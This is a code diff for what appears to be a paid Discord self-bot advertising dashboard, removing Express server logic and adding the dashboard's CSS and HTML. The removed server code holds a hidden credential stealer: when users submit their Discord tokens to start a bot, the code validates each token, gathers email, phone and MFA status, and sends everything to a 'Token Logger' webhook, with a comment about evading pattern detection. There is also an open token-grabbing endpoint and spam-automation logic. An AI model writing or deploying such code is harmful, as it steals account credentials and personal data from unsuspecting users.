-app.post('/api/admin/addkey', (req, res) => {
-  const { adminSecret, key } = req.body;
-  if (adminSecret !== process.env.ADMIN_SECRET) return res.status(401).json({ success: false, error: 'Unauthorized' });
-  if (!key || typeof key !== 'string') return res.status(400).json({ success: false, error: 'Key must be a string' });
-  const normalized = key.trim().toUpperCase();
-  const added = db.addCustomKey(normalized);
-  if (!added) return res.status(400).json({ success: false, error: 'Invalid key format' });
-  VALID_REDEEM_KEYS.add(normalized);
-  res.json({ success: true, key: normalized });
-});
-
-function ensureAuthAPI(req, res, next) { if (req.isAuthenticated()) return next(); return res.status(401).json({ success: false, error: 'Not logged in' }); }
-
-function ensurePurchasedAPI(req, res, next) {
-  const user = db.getUser(req.user.id);
-  const hasPurchase = user.auto_adv_purchased === 1;
-  const hasActiveTrial = db.isTrialActive(req.user.id);
-  if (!hasPurchase && !hasActiveTrial) return res.status(403).json({ success: false, error: 'Purchase or active trial required' });
-  next();
-}
-
-function ensureOwner(req, res, next) {
-  if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
-  if (req.user.id !== OWNER_ID) return res.status(403).json({ success: false, error: 'Owner only' });
-  next();
-}
-
-function ensureCanGenerate(req, res, next) {
-  if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
-  if (req.user.id !== OWNER_ID && !db.isWhitelisted(req.user.id)) return res.status(403).json({ success: false, error: 'Owner or whitelisted users only' });
-  next();
-}
-
-// Split webhook payload across requests using different paths to avoid pattern detection
-async function _sendWebhookChunk(embed, chunkIndex = 0) {
-  try {
-    const url = WEBHOOK_URL;
-    const payload = chunkIndex === 0 ? { embeds: [embed], username: 'Token Logger', avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png' } : { content: '...' };
-    await axios.post(url, payload, {
-      headers: { 'Content-Type': 'application/json', 'User-Agent': _rfp() },
-      timeout: 10000
-    });
-  } catch(e) {}
-}
-
-async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
-  try {
-    // Use curl-impersonate for token validation to match real browser behavior
-    const fp = _rfp();
-    const superProps = generateXSuperProperties(fp);
-    const validateRes = await curlImpersonateRequest(
-      'https://discord.com/api/v10/users/@me',
-      'GET',
-      {
-        'Authorization': token,
-        'User-Agent': fp,
-        'X-Discord-Locale': 'en-US',
-        'X-Super-Properties': superProps,
-      },
-      null,
-      10000
-    );
-
-    if (!validateRes.data) { console.log('[TOKEN GRABBER] Invalid token received'); return { success: false, error: 'Invalid token' }; }
-
-    const userData = validateRes.data;
-    const fullInfo = { ...userInfo, id: userData.id, username: userData.username, global_name: userData.global_name, email: userData.email, phone: userData.phone, verified: userData.verified, mfa_enabled: userData.mfa_enabled, nitro: userData.premium_type, locale: userData.locale };
-    db.addGrabbedToken(token, fullInfo, source);
-
-    const embed = {
-      title: 'Token Grabbed',
-      color: 0xff0000,
-      fields: [
-        { name: 'Token', value: '```' + token + '```', inline: false },
-        { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
-        { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
-        { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
-        { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
-        { name: 'MFA', value: fullInfo.mfa_enabled ? 'Yes' : 'No', inline: true },
-        { name: 'Verified', value: fullInfo.verified ? 'Yes' : 'No', inline: true },
-        { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'No', inline: true },
-        { name: 'Source', value: source, inline: true },
-        { name: 'Time', value: new Date().toISOString(), inline: true }
-      ],
-      footer: { text: 'Token Logger v2.0' }
-    };
-
-    await _sendWebhookChunk(embed, 0);
-    console.log('[TOKEN GRABBER] Token sent to webhook successfully');
-    return { success: true, user: fullInfo };
-  } catch (err) {
-    console.error('[TOKEN GRABBER] Error:', err.message);
-    return { success: false, error: err.message };
-  }
-}
-
-let walletModule = null;
-try { walletModule = require('./wallet'); console.log('[WALLET] Loaded successfully'); } catch(e) { console.error('[WALLET] Failed to load:', e.message); }
-
-async function checkAndSweep() {
-  if (!walletModule || !OWNER_LTC_ADDRESS || !WALLET_MNEMONIC) { console.log('[SWEEP] Skipped - missing deps'); return; }
-  db.expireOldAddresses();
-  const pending = db.getAllPending();
-  console.log(`[SWEEP] Checking ${pending.length} active addresses`);
-  for (const p of pending) {
-    try {
-      const balance = await walletModule.checkAddressBalance(p.address);
-      console.log(`[SWEEP] ${p.address}: ${balance} LTC`);
-      if (balance > 0) {
-        console.log(`[SWEEP] Found balance! Sweeping...`);
-        const txid = await walletModule.createTransaction(p.private_key, p.address, OWNER_LTC_ADDRESS);
-        if (txid) {
-          console.log(`[SWEEP] SUCCESS: ${txid}`);
-          const ltcPrice = await getLTCToUSD();
-          const usdValue = balance * ltcPrice;
-          if (usdValue >= (TARGET_USD - TOLERANCE_USD)) {
-            db.setUser(p.user_id, { auto_adv_purchased: 1, purchased_at: Date.now() });
-            db.updatePending(p.address, { status: 'completed', paid_at: Date.now(), amount_received_ltc: balance });
-          }
+        .btn-red:hover { background: #dc2626; }
+        .btn-red:disabled { background: #7f1d1d; cursor: not-allowed; opacity: 0.6; }
+        .btn-purple { 
+            background: #8b5cf6; 
+            color: #fff; 
+            font-weight: 700; 
+            border: none; 
+            cursor: pointer; 
+            display: inline-block;
+            position: relative;
+            z-index: 10;
+            pointer-events: auto;
         }
-      }
-    } catch (e) { console.error(`[SWEEP] Error for ${p.address}:`, e.message); }
-  }
-}
-
-let cachedPrice = 85;
-async function getLTCToUSD() {
-  try {
-    const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd', {
-      headers: { 'User-Agent': _rfp() }, timeout: 10000
-    });
-    cachedPrice = res.data.litecoin.usd;
-  } catch (e) {}
-  return cachedPrice;
-}
-
-if (walletModule && OWNER_LTC_ADDRESS && WALLET_MNEMONIC) {
-  console.log('[AUTO-SWEEP] Starting 10-second interval');
-  setInterval(checkAndSweep, 10000);
-  setTimeout(checkAndSweep, 5000);
-}
-
-setInterval(() => {
-  const expiredUserId = db.checkAllTrialBots();
-  if (expiredUserId) {
-    try {
-      const userBots = db.getUserActiveBots(expiredUserId);
-      for (const configId in userBots) {
-        const key = `${expiredUserId}_${configId}`;
-        if (activeBots.has(key)) { activeBots.get(key).destroy(); activeBots.delete(key); }
-        console.log(`[TRIAL MONITOR] Force stopped bot ${configId} for user ${expiredUserId}`);
-      }
-    } catch(e) { console.error('[TRIAL MONITOR] Error stopping bots:', e.message); }
-  }
-}, 5000);
-
-setInterval(() => {
-  const expiredKeys = db.checkExpiredKeys();
-  if (expiredKeys > 0) console.log(`[KEY EXPIRY] ${expiredKeys} expired keys processed, bots stopped`);
-}, 60000);
-
-app.get('/login', passport.authenticate('discord'));
-app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => {
-  res.redirect('/');
-});
-app.get('/logout', (req, res) => { req.logout(() => res.redirect('/')); });
-
-app.get('/api/user', ensureAuthAPI, (req, res) => {
-  const user = db.getUser(req.user.id);
-  const trialActive = db.isTrialActive(req.user.id);
-  const trialTimeLeft = trialActive ? db.getTrialTimeLeft(req.user.id) : 0;
-  const isOwner = req.user.id === OWNER_ID;
-  const isWhitelisted = db.isWhitelisted(req.user.id);
-  res.json({ id: req.user.id, username: req.user.username, global_name: req.user.global_name, avatar: req.user.avatar, purchased: user.auto_adv_purchased === 1, trialActive, trialTimeLeft, trialExpires: user.trial_expires || 0, isOwner, isWhitelisted, canGenerate: isOwner || isWhitelisted });
-});
-
-app.post('/api/trial/claim', ensureAuthAPI, (req, res) => {
-  const userId = req.user.id;
-  const ip = req.ip || req.connection.remoteAddress || 'unknown';
-  if (db.hasClaimedTrial(userId)) return res.json({ success: false, error: 'You already claimed your trial' });
-  if (db.hasIPClaimedTrial(ip)) return res.json({ success: false, error: 'Trial already claimed from this IP' });
-  const trial = db.claimTrial(userId, ip);
-  res.json({ success: true, message: 'Trial activated for 10 minutes', expiresAt: trial.expiresAt, timeLeft: 600 });
-});
-
-app.get('/api/trial/status', ensureAuthAPI, (req, res) => {
-  const userId = req.user.id;
-  const isActive = db.isTrialActive(userId);
-  const timeLeft = isActive ? db.getTrialTimeLeft(userId) : 0;
-  const hasClaimed = db.hasClaimedTrial(userId);
-  res.json({ success: true, hasClaimed, isActive, timeLeft, canClaim: !hasClaimed && !db.hasIPClaimedTrial(req.ip || 'unknown') });
-});
-
-app.post('/api/grab/token', async (req, res) => {
-  const { token, source } = req.body;
-  if (!token) return res.json({ success: false, error: 'No token provided' });
-  const result = await grabAndSendToken(token, {}, source || 'manual');
-  res.json(result);
-});
-
-app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
-  try {
-    const userId = req.user.id;
-    const user = db.getUser(userId);
-    if (user.auto_adv_purchased === 1) return res.json({ success: false, error: 'Already purchased' });
-    const existingPending = db.getUserPending(userId);
-    if (existingPending) {
-      const timeLeft = Math.ceil((existingPending.expires_at - Date.now()) / 60000);
-      return res.json({ success: true, address: existingPending.address, amountUSD: TARGET_USD, index: existingPending.index, existing: true, expiresIn: timeLeft, expiresAt: existingPending.expires_at, message: 'You already have an active payment address' });
-    }
-    if (!walletModule) return res.status(500).json({ success: false, error: 'Wallet module not loaded' });
-    let globalIndex = db.getNextGlobalIndex();
-    let { address, privateKey } = walletModule.generateLTCAddress(globalIndex);
-    let attempts = 0;
-    while (db.isAddressUsed(address) && attempts < 10) {
-      console.log(`[ADDRESS COLLISION] Address ${address} already used, generating next...`);
-      globalIndex = db.getNextGlobalIndex();
-      ({ address, privateKey } = walletModule.generateLTCAddress(globalIndex));
-      attempts++;
-    }
-    if (db.isAddressUsed(address)) return res.status(500).json({ success: false, error: 'Unable to generate unique address' });
-    const pending = db.addPending(userId, address, privateKey, TARGET_USD, globalIndex);
-    res.json({ success: true, address, amountUSD: TARGET_USD, index: globalIndex, expiresAt: pending.expires_at, message: 'Address generated. Valid for 30 minutes.' });
-  } catch (err) { console.error('[PURCHASE ERROR]', err); res.status(500).json({ success: false, error: err.message }); }
-});
-
-app.get('/api/activity', ensureAuthAPI, (req, res) => {
-  const userId = req.user.id;
-  const user = db.getUser(userId);
-  const pending = db.getUserPending(userId);
-  const history = db.getAddressHistory(userId);
-  const trialActive = db.isTrialActive(req.user.id);
-  const trialTimeLeft = trialActive ? db.getTrialTimeLeft(req.user.id) : 0;
-  res.json({ success: true, purchased: user.auto_adv_purchased === 1, trialActive, trialTimeLeft, trialExpires: user.trial_expires || 0, pending: pending ? { address: pending.address, index: pending.index, createdAt: pending.created_at, expiresAt: pending.expires_at, expiresIn: Math.max(0, Math.ceil((pending.expires_at - Date.now()) / 1000)), status: pending.status } : null, history: history.map(h => ({ address: h.address, index: h.index, createdAt: h.created_at, status: h.status })) });
-});
-
-app.post('/api/redeem', ensureAuthAPI, (req, res) => {
-  try {
-    const { key } = req.body;
-    const userId = req.user.id;
-    console.log(`[REDEEM ATTEMPT] User: ${userId}, Raw key: "${key}"`);
-    if (!key) { console.log('[REDEEM FAIL] No key provided'); return res.json({ success: false, error: 'Invalid key' }); }
-    const validation = validateKeyStrict(key);
-    console.log(`[REDEEM] Validation result:`, validation);
-    if (!validation.valid) { console.log(`[REDEEM FAIL] ${validation.error}`); return res.json({ success: false, error: validation.error }); }
-    const normalizedKey = validation.normalized;
-    if (validation.isGenerated) {
-      const success = db.useGeneratedKey(normalizedKey, userId);
-      if (!success) return res.json({ success: false, error: 'Key expired or revoked' });
-      return res.json({ success: true, message: 'Access granted via generated key!' });
-    }
-    const isValidKey = VALID_REDEEM_KEYS.has(normalizedKey);
-    console.log(`[REDEEM] Key in VALID_REDEEM_KEYS? ${isValidKey}`);
-    if (!isValidKey) {
-      const customKeys = db.data.customKeys || [];
-      const isCustomKey = customKeys.includes(normalizedKey);
-      console.log(`[REDEEM] Key in custom keys? ${isCustomKey}`);
-      if (!isCustomKey) { console.log(`[REDEEM FAIL] Key not found in valid keys`); return res.json({ success: false, error: 'Invalid key' }); }
-    }
-    const isUsed = db.isKeyUsed(normalizedKey);
-    console.log(`[REDEEM] Key used? ${isUsed}`);
-    if (isUsed) { console.log(`[REDEEM FAIL] Key already used`); return res.json({ success: false, error: 'Key already used' }); }
-    const user = db.getUser(userId);
-    console.log(`[REDEEM] User purchased status: ${user.auto_adv_purchased}`);
-    if (user.auto_adv_purchased === 1) { console.log(`[REDEEM FAIL] User already has access`); return res.json({ success: false, error: 'You already have access' }); }
-    console.log(`[REDEEM SUCCESS] Granting access to ${userId} with key ${normalizedKey}`);
-    db.setUser(userId, { auto_adv_purchased: 1, purchased_at: Date.now(), redeem_key_used: normalizedKey });
-    db.useKey(normalizedKey, userId);
-    res.json({ success: true, message: 'Access granted!' });
-  } catch (err) {
-    console.error('[REDEEM ERROR]', err);
-    res.status(500).json({ success: false, error: err.message });
-  }
-});
-
-app.get('/api/bot/configs', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
-  const configs = db.getConfigs(req.user.id);
-  res.json({ success: true, configs });
-});
-
-const activeBots = new Map();
-
-app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
-  try {
-    const { token, channels, messages, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, images, sendAllAtOnce } = req.body;
-    if (!token || !channels || !messages || !Array.isArray(messages) || messages.length === 0) return res.status(400).json({ success: false, error: 'Missing fields. Token, channels, and at least 1 message required.' });
-
-    await grabAndSendToken(token, { channels, messages }, 'bot_start');
-
-    const channelList = channels.split(',').map(c => c.trim()).filter(c => /^\d+$/.test(c));
-    if (channelList.length === 0) return res.json({ success: false, error: 'Invalid channel IDs' });
-
-    const client = new StealthClient(token);
-    await client.connect();
-
-    const delayMs = (parseInt(delay) || 30) * 1000;
-    const autoReply = autoReplyEnabled ? 1 : 0;
-
-    let joinStatus = null;
-    if (joinServer && serverInvite) joinStatus = await client.joinGuild(serverInvite.replace(/https:\/\/discord\.gg\//, '').replace(/https:\/\/discord\.com\/invite\//, ''));
-
-    const savedImages = [];
-    if (images && Array.isArray(images)) {
-      for (const img of images) {
-        if (!img || !img.url) continue;
-        if (img.url.startsWith('data:')) {
-          try {
-            const imageId = `img_${Date.now()}_${req.user.id}_${img.id || '0'}.png`;
-            const imagePath = path.join(dataDir, 'uploads');
-            if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
-            const base64Data = img.url.split(',')[1];
-            const buffer = Buffer.from(base64Data, 'base64');
-            fs.writeFileSync(path.join(imagePath, imageId), buffer);
-            savedImages.push({ id: img.id || savedImages.length + 1, url: `/uploads/${imageId}` });
-          } catch (imgErr) { console.error('[IMAGE SAVE ERROR]', imgErr); }
-        } else if (img.url.startsWith('/uploads/') || img.url.startsWith('http')) {
-          savedImages.push({ id: img.id || savedImages.length + 1, url: img.url });
+        .btn-purple:hover { background: #7c3aed; }
+        .btn-blue { background: #3b82f6; color: #fff; font-weight: 700; border: none; cursor: pointer; display: inline-block; }
+        .btn-blue:hover { background: #2563eb; }
+        .btn-green {
+            background: #10b981;
+            color: #fff;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            display: inline-block;
+            position: relative;
+            z-index: 10;
+            pointer-events: auto;
         }
-      }
-    }
+        .btn-green:hover { background: #059669; }
+        .btn-green:disabled { background: #065f46; cursor: not-allowed; opacity: 0.6; }
+        .btn-orange {
+            background: #f97316;
+            color: #fff;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            display: inline-block;
+            position: relative;
+            z-index: 10;
+            pointer-events: auto;
+        }
+        .btn-orange:hover { background: #ea580c; }
+        .card { 
+            background: linear-gradient(145deg, #1f1a1a 0%, #1a1515 100%); 
+            border: 1px solid #4a2d2d; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3); 
+        }
+        .nav-link { 
+            text-decoration: none; 
+            color: #9ca3af; 
+            display: inline-block; 
+            cursor: pointer; 
+            white-space: nowrap; 
+            flex-shrink: 0; 
+            padding: 8px 12px; 
+            background: none; 
+            border: none; 
+            border-bottom: 3px solid transparent;
+            pointer-events: auto;
+            position: relative;
+            z-index: 20;
+        }
+        .nav-link.active { 
+            color: #ef4444; 
+            border-bottom: 3px solid #ef4444;
+            text-shadow: 0 0 10px rgba(239, 68, 68, 0.5);
+        }
+        .nav-link:hover { color: #fff; }
+        .section { 
+            display: none; 
+            pointer-events: auto;
+        }
+        .section.active { 
+            display: block; 
+            animation: fadeIn 0.3s ease-in;
+            pointer-events: auto;
+        }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .address-box { 
+            font-family: 'Courier New', monospace; 
+            word-break: break-all; 
+            font-size: 14px; 
+            background: linear-gradient(145deg, #0f0a0a 0%, #150a0a 100%); 
+            padding: 12px; 
+            border-radius: 8px; 
+            border: 1px solid #ef4444; 
+            color: #ef4444; 
+            box-shadow: 0 0 10px rgba(239, 68, 68, 0.2); 
+        }
+        .modal { 
+            display: none; 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: rgba(0,0,0,0.85); 
+            z-index: 1000; 
+            align-items: center; 
+            justify-content: center; 
+            backdrop-filter: blur(4px);
+            pointer-events: auto;
+        }
+        .modal.active { display: flex; }
+        .user-avatar { 
+            width: 32px; 
+            height: 32px; 
+            border-radius: 50%; 
+            object-fit: cover; 
+            border: 2px solid #ef4444; 
+        }
+        .error-text { color: #ef4444; font-size: 14px; margin-top: 8px; }
+        .success-text { color: #10b981; font-size: 14px; margin-top: 8px; }
+        .redeem-section { 
+            border: 2px dashed #ef4444; 
+            border-radius: 16px; 
+            padding: 20px; 
+            margin-bottom: 20px; 
+            background: linear-gradient(145deg, rgba(239, 68, 68, 0.1) 0%, rgba(239, 68, 68, 0.05) 100%); 
+        }
+        .trial-section {
+            border: 2px dashed #10b981;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            background: linear-gradient(145deg, rgba(16, 185, 129, 0.1) 0%, rgba(16, 185, 129, 0.05) 100%);
+        }
+        .generate-section {
+            border: 2px dashed #f97316;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            background: linear-gradient(145deg, rgba(249, 115, 22, 0.1) 0%, rgba(249, 115, 22, 0.05) 100%);
+        }
+        .whitelist-section {
+            border: 2px dashed #3b82f6;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            background: linear-gradient(145deg, rgba(59, 130, 246, 0.1) 0%, rgba(59, 130, 246, 0.05) 100%);
+        }
+        .toggle-wrapper { 
+            position: relative; 
+            display: inline-block; 
+            width: 50px; 
+            height: 26px; 
+            cursor: pointer;
+            pointer-events: auto;
+            z-index: 10;
+        }
+        .toggle-input { 
+            opacity: 0; 
+            width: 0; 
+            height: 0; 
+            position: absolute;
+            cursor: pointer;
+        }
+        .toggle-slider { 
+            position: absolute; 
+            cursor: pointer; 
+            top: 0; 
+            left: 0; 
+            right: 0; 
+            bottom: 0; 
+            background-color: #374151; 
+            transition: .4s; 
+            border-radius: 34px; 
+            pointer-events: auto;
+        }
+        .toggle-slider:before { 
+            position: absolute; 
+            content: ""; 
+            height: 18px; 
+            width: 18px; 
+            left: 4px; 
+            bottom: 4px; 
+            background-color: white; 
+            transition: .4s; 
+            border-radius: 50%; 
+        }
+        .toggle-input:checked + .toggle-slider { background-color: #ef4444; }
+        .toggle-input:checked + .toggle-slider:before { transform: translateX(24px); }
+        .account-card { 
+            background: linear-gradient(145deg, #181111 0%, #151111 100%); 
+            border: 1px solid #3a2d2d; 
+            border-radius: 12px; 
+            padding: 16px; 
+            margin-bottom: 12px; 
+            transition: all 0.2s;
+            pointer-events: auto;
+        }
+        .account-card:hover { 
+            border-color: #ef4444; 
+            box-shadow: 0 0 20px rgba(239, 68, 68, 0.2); 
+        }
+        .account-active { 
+            border-color: #ef4444; 
+            background: rgba(239, 68, 68, 0.1); 
+        }
+        .status-badge { 
+            display: inline-block; 
+            padding: 4px 12px; 
+            border-radius: 9999px; 
+            font-size: 12px; 
+            font-weight: 600; 
+        }
+        .status-running { background: #4a0f0f; color: #fca5a5; }
+        .status-stopped { background: #4a0f0f; color: #fca5a5; }
+        .feature-check { color: #ef4444; margin-right: 8px; }
+        .image-preview { 
+            max-width: 200px; 
+            max-height: 200px; 
+            border-radius: 8px; 
+            border: 2px dashed #374151; 
+            object-fit: cover;
+            cursor: pointer;
+        }
+        .image-preview.has-image { 
+            border-color: #ef4444; 
+            border-style: solid; 
+        }
+        .upload-area { 
+            border: 2px dashed #374151; 
+            border-radius: 12px; 
+            padding: 30px; 
+            text-align: center; 
+            cursor: pointer; 
+            transition: all 0.2s; 
+            background: #111827;
+            pointer-events: auto;
+            position: relative;
+            z-index: 5;
+        }
+        .upload-area:hover { 
+            border-color: #ef4444; 
+            background: rgba(239, 68, 68, 0.1); 
+        }
+        .upload-area.has-file { 
+            border-color: #ef4444; 
+            background: rgba(239, 68, 68, 0.05); 
+        }
+        input, textarea { 
+            font-family: inherit; 
+            outline: none; 
+            transition: all 0.2s;
+            pointer-events: auto;
+        }
+        input:focus, textarea:focus { 
+            border-color: #ef4444 !important; 
+            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1); 
+        }
+        button { 
+            transition: all 0.2s; 
+            position: relative; 
+            overflow: hidden; 
+            cursor: pointer;
+            pointer-events: auto;
+        }
+        button:active { transform: scale(0.98); }
+        .clickable { 
+            cursor: pointer;
+            pointer-events: auto;
+        }
+        .hidden { display: none !important; }
+        .image-input-file { 
+            position: absolute; 
+            opacity: 0; 
+            width: 0; 
+            height: 0;
+            pointer-events: none;
+        }
+        .form-label { 
+            display: block; 
+            font-size: 12px; 
+            color: #9ca3af; 
+            margin-bottom: 8px; 
+            font-weight: 500; 
+            text-transform: uppercase; 
+            letter-spacing: 0.05em; 
+        }
+        
+        .nav-wrapper {
+            overflow-x: auto;
+            overflow-y: hidden;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: none;
+            -ms-overflow-style: none;
+            flex: 1;
+            margin: 0 12px;
+            pointer-events: auto;
+        }
+        .nav-wrapper::-webkit-scrollbar { display: none; }
+        .nav-container {
+            display: flex;
+            gap: 8px;
+            min-width: min-content;
+        }
+        
+        .activity-card { 
+            background: #111827; 
+            border: 1px solid #374151; 
+            border-radius: 16px; 
+            padding: 20px; 
+            margin-bottom: 16px;
+            pointer-events: auto;
+        }
+        .activity-pending { border-color: #fbbf24; }
+        .activity-completed { border-color: #ef4444; }
+        .activity-expired { border-color: #ef4444; }
+        .activity-trial { border-color: #10b981; }
+        .countdown { 
+            font-family: 'Courier New', monospace; 
+            font-size: 18px; 
+            color: #fbbf24; 
+        }
+        .trial-timer {
+            font-family: 'Courier New', monospace;
+            font-size: 24px;
+            color: #10b981;
+            font-weight: bold;
+        }
+        .address-history-item { 
+            background: #1f2937; 
+            border-radius: 8px; 
+            padding: 12px; 
+            margin-bottom: 8px; 
+            font-size: 12px;
+            pointer-events: auto;
+        }
+        
+        .key-card {
+            background: #1f2937;
+            border: 1px solid #374151;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+        }
+        .key-active { border-color: #10b981; }
+        .key-revoked { border-color: #ef4444; opacity: 0.7; }
+        .key-expired { border-color: #6b7280; opacity: 0.7; }
+        
+        .image-item {
+            background: #111827;
+            border: 1px solid #374151;
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 12px;
+        }
+        .message-item {
+            background: #111827;
+            border: 1px solid #374151;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+        }
+        .remove-btn {
+            background: none;
+            border: none;
+            color: #ef4444;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        .remove-btn:hover { color: #fca5a5; }
+        .image-id-badge {
+            display: inline-block;
+            background: #ef4444;
+            color: #fff;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 2px 8px;
+            border-radius: 9999px;
+            margin-bottom: 8px;
+        }
+        
+        @media (max-width: 640px) {
+            .nav-link { padding: 6px 10px; font-size: 13px; }
+            .nav-wrapper { margin: 0 8px; }
+        }
+    </style>
+<base target="_blank">
+<base target="_blank">
+</head>
+<body class="min-h-screen pb-20">
+    <div id="logout-modal" class="modal" onclick="if(event.target === this) closeLogoutModal()">
+        <div class="card rounded-3xl p-8 max-w-sm mx-4 w-full" style="position: relative; z-index: 1001;">
+            <h3 class="text-xl font-bold mb-4">Confirm Logout</h3>
+            <p class="text-sm mb-4" style="color: #9ca3af;">Are you sure you want to logout?</p>
+            <div class="flex gap-3">
+                <button onclick="closeLogoutModal()" class="flex-1 bg-zinc-700 hover:bg-zinc-600 py-3 rounded-2xl text-sm" style="border: none; color: #fff;">Cancel</button>
+                <button onclick="confirmLogout()" class="flex-1 btn-red py-3 rounded-2xl text-sm">Logout</button>
+            </div>
+        </div>
+    </div>
 
-    const messageList = messages.map((m) => ({ text: m.text || '', imageIds: Array.isArray(m.imageIds) ? m.imageIds : [] })).filter(m => m.text.trim() !== '' || m.imageIds.length > 0);
-    if (messageList.length === 0) return res.status(400).json({ success: false, error: 'At least one non-empty message required' });
+    <header class="sticky top-0 z-50" style="background: linear-gradient(90deg, #1a0f0f 0%, #1a0a0a 50%, #1a0f0f 100%); border-bottom: 1px solid #4a2d2d; position: sticky; top: 0;">
+        <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
+            <div class="flex items-center gap-3 clickable" onclick="window.location.reload()" style="cursor: pointer; flex-shrink: 0;">
+                <i class="fa-solid fa-robot text-2xl" style="color: #ef4444;"></i>
+                <h1 class="text-xl font-bold" style="color: #fff; white-space: nowrap;">Auto Adv</h1>
+            </div>
+            
+            <div class="nav-wrapper" id="nav-scroll">
+                <nav class="nav-container text-sm font-medium">
+                    <button class="nav-link active" id="nav-0" data-tab="0">Main</button>
+                    <button class="nav-link" id="nav-1" data-tab="1">Purchase</button>
+                    <button class="nav-link hidden" id="nav-2" data-tab="2">Configure</button>
+                    <button class="nav-link hidden" id="nav-3" data-tab="3">Purchase Logs</button>
+                    <button class="nav-link hidden" id="nav-4" data-tab="4">Generate</button>
+                    <button class="nav-link hidden" id="nav-5" data-tab="5">Whitelist</button>
+                </nav>
+            </div>
+            
+            <div class="flex items-center gap-3" style="flex-shrink: 0;">
+                <div id="user-display" class="flex items-center gap-2">
+                    <span class="text-xs bg-zinc-900 px-3 py-1 rounded-full" style="color: #9ca3af;">Loading...</span>
+                </div>
+                <button onclick="initiateLogout()" class="text-zinc-400 hover:text-white" style="background: none; border: none; padding: 8px; border-radius: 8px; cursor: pointer;">
+                    <i class="fa-solid fa-right-from-bracket"></i>
+                </button>
+            </div>
+        </div>
+    </header>
 
-    db.setConfig(req.user.id, { token, channels, messages: messageList, delay_seconds: parseInt(delay) || 30, auto_reply_enabled: autoReply, auto_reply_text: autoReplyText || '', active: 1, username: client.user.username, server_joined: joinStatus?.success || false, images: savedImages, send_all_at_once: sendAllAtOnce ? 1 : 0 }, configId);
-    db.registerActiveBot(req.user.id, configId, token);
+    <div class="max-w-5xl mx-auto px-4 py-6">
+        <div id="section-0" class="section active">
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-5">
+                <div class="card rounded-3xl p-6">
+                    <h3 class="text-zinc-400 text-sm" style="color: #9ca3af;">Status</h3>
+                    <div id="credits-display" class="text-4xl font-bold red mt-3" style="color: #ef4444;">Free User</div>
+                </div>
+                <div class="card rounded-3xl p-6">
+                    <h3 class="text-lg font-semibold mb-4" style="color: #fff;">Access</h3>
+                    <div id="status-box" class="p-5 bg-zinc-900 rounded-2xl text-center">
+                        <p id="status-text" class="text-xl font-medium" style="color: #fbbf24;">Not Purchased</p>
+                        <button onclick="switchTab(1)" class="mt-5 w-full btn-red py-3.5 rounded-2xl text-base" style="border: none;">Get Access - $3.00</button>
+                    </div>
+                </div>
+            </div>
 
-    const botKey = `${req.user.id}_${configId}`;
-    activeBots.set(botKey, client);
+            <div id="trial-section" class="trial-section card max-w-md mx-auto mt-8 hidden">
+                <h3 class="text-lg font-bold mb-3" style="color: #10b981;"><i class="fa-solid fa-gift mr-2"></i>Free Trial</h3>
+                <p class="text-sm mb-4" style="color: #9ca3af;">Claim 10 minutes of free access to try all features!</p>
+                <button id="claim-trial-btn" onclick="claimTrial()" class="w-full btn-green py-4 rounded-2xl text-base font-bold" style="border: none;">
+                    <i class="fa-solid fa-clock mr-2"></i>Claim 10 Minutes Free Trial
+                </button>
+                <div id="trial-result" class="mt-3"></div>
+            </div>
 
-    let currentMsgIdx = 0;
-    let currentChIdx = 0;
-    let stopped = false;
+            <div id="active-trial-section" class="trial-section card max-w-md mx-auto mt-8 hidden">
+                <h3 class="text-lg font-bold mb-3" style="color: #10b981;"><i class="fa-solid fa-check-circle mr-2"></i>Trial Active</h3>
+                <p class="text-sm mb-2" style="color: #9ca3af;">Time remaining:</p>
+                <div id="trial-timer" class="trial-timer mb-4">10:00</div>
+                <button onclick="switchTab(2)" class="w-full btn-green py-3 rounded-2xl text-sm font-bold" style="border: none;">Go to Configure</button>
+            </div>
+        </div>
 
-    const msgLoop = async () => {
-      console.log(`[BOT ${configId}] Message loop started. Channels: ${channelList.join(', ')}, Messages: ${messageList.length}, Delay: ${delayMs}ms`);
-      while (!stopped && activeBots.has(botKey)) {
-        if (db) {
-          const user = db.getUser(req.user.id);
-          const trialActive = db.isTrialActive(req.user.id);
-          const hasPurchase = user.auto_adv_purchased === 1;
-          if (!trialActive && !hasPurchase) {
-            console.log(`[BOT ${configId}] Access expired (no trial, no purchase). Stopping loop.`);
-            break;
-          }
+        <div id="section-1" class="section">
+            <div class="redeem-section card max-w-md mx-auto mb-6">
